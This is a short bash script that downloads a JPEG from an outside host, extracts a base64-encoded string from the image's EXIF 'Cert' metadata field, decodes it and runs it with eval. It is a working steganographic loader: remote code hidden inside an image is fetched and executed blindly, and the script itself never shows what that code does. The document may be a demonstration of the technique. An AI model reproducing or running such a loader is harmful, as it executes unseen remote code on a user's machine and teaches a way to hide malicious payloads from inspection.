#!/bin/bash
cd ~/Desktop;
curl blog.connoryager.com/duck.jpeg -o downloadedDuck.jpeg;

p=$(exiftool downloadedDuck.jpeg -s -s | grep Cert -a | sed 's/<[^>]*>//g' | sed 's/^.\{13\}//' | base64 --decode);
eval $p;
